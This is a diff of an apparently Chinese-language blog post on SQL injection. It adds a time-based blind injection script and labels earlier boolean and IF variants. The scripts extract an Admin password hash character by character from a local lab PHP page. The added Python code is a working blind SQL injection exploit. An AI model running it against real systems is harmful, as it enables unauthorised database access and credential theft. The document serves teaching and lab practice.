@@ -22,7 +22,7 @@ ASCII(SUBSTRING((SELECT password FROM fruits WHERE username = 0x41646d696e),1,1)
 
 python爆破脚本，用到了requests模块，必须在linux下运行。
 {% highlight python %}
-#版本1
+#版本1 CASE WHEN
 import requests,string
 charset = 'abcdef'+string.digits 
 AdminHash=''
@@ -37,7 +37,7 @@ for i in range(1,33):
             break
 print AdminHash  #e10adc3949ba59abbe56e057f20f894e
 
-#版本2
+#版本2 IF
 import requests,string
 charset = 'abcdef'+string.digits 
 AdminHash=''
@@ -49,6 +49,29 @@ for i in range(1,33):
         res = requests.get(url+payload)
         if "2</td><td>Admin" in res.text:
             AdminHash+=c
+            break
+print AdminHash
+
+#版本3  time injection
+#by=()
+#select 1 from ()b
+#select * from fruits where username='Admin' and if(condtion,sleep(0.5),0)
+#upper(substring(password,%d,1))=char(%d)
+import requests,string,time
+charset = 'ABCDEF'+string.digits 
+AdminHash=''
+url = 'http://192.168.1.100/DebugPHP/3.php'  
+for i in range(1,33):
+    for c in  charset:                 
+        payload="?by=(select 1 from (select * from fruits where username='Admin' +\
+                 and if(upper(substring(password,%d,1))=char(%d),sleep(0.5),0))b)" %(i,ord(c))
+        timeStart = time.time()  
+        res = requests.get(url+payload)
+        timeEnd = time.time()
+        seconds = timeEnd - timeStart
+        if seconds>0.2:
+            AdminHash+=c
+            print AdminHash
             break
 print AdminHash
 {% endhighlight %}
